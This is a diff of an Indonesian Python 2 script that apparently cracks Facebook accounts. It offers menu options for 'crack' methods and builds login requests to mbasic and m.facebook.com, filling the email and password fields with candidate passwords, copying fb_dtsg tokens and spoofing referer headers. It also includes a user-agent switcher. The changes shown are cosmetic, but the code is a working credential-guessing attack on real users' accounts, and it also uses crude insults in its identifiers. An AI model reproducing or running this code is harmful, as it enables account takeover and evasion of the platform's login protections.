@@ -248,14 +248,14 @@ class ngentod:
                     print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
                     print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
                     print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-                    print ' [%s03%s] methode mobile (crack sangat lambat) hasil banyak kemungkinan besar akun terkena checkpoint berkurang / one tab yes'%(K,P)
+                    print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
             print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
             print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
             print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-            print ' [%s03%s] methode mobile (crack sangat lambat) hasil banyak kemungkinan besar akun terkena checkpoint berkurang / one tab yes'%(K,P)
+            print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
             self.langsung()
         else:
             print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -378,16 +378,16 @@ class ngentod:
             b = bs4.BeautifulSoup(p.text, 'html.parser')
             dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
             data = {}
-            for i in b('input'):
-            	if i.get('value') is None:
-            	    if i.get('name') == 'email':
+            for rom in b('input'):
+            	if rom.get('value') is None:
+            	    if rom.get('name') == 'email':
             	        data.update({"email":user})
-                    elif i.get("name")=="pass":
+                    elif rom.get("name")=="pass":
                     	data.update({"pass":pw})
                     else:
-                    	data.update({i.get('name'): ''})
+                    	data.update({rom.get('name'): ''})
                 else:
-                	data.update({i.get('name'): i.get('value')})
+                	data.update({rom.get('name'): rom.get('value')})
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
             ses.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
@@ -437,16 +437,16 @@ class ngentod:
             b = bs4.BeautifulSoup(p.text, 'html.parser')
             dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
             data = {}
-            for i in b('input'):
-            	if i.get('value') is None:
-            	    if i.get('name') == 'email':
+            for rom in b('input'):
+            	if rom.get('value') is None:
+            	    if rom.get('name') == 'email':
             	        data.update({"email":user})
-                    elif i.get("name")=="pass":
+                    elif rom.get("name")=="pass":
                     	data.update({"pass":pw})
                     else:
-                    	data.update({i.get('name'): ''})
+                    	data.update({rom.get('name'): ''})
                 else:
-                	data.update({i.get('name'): i.get('value')})
+                	data.update({rom.get('name'): rom.get('value')})
             data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
             '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
             ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
@@ -484,8 +484,8 @@ class ngentod:
         sys.stdout.flush()
 # GANTI USER AGENT
 def useragent():
-	print ("\n%s [%s01%s] Ganti user agents "%(P,K,P))
-	print (" [%s02%s] Cek user agents "%(K,P))
+	print ("\n%s [%s01%s] Ganti user agent "%(P,K,P))
+	print (" [%s02%s] Cek user agent "%(K,P))
 	print (" [%s00%s] Kembali "%(M,P))
 	uas()
 def uas():
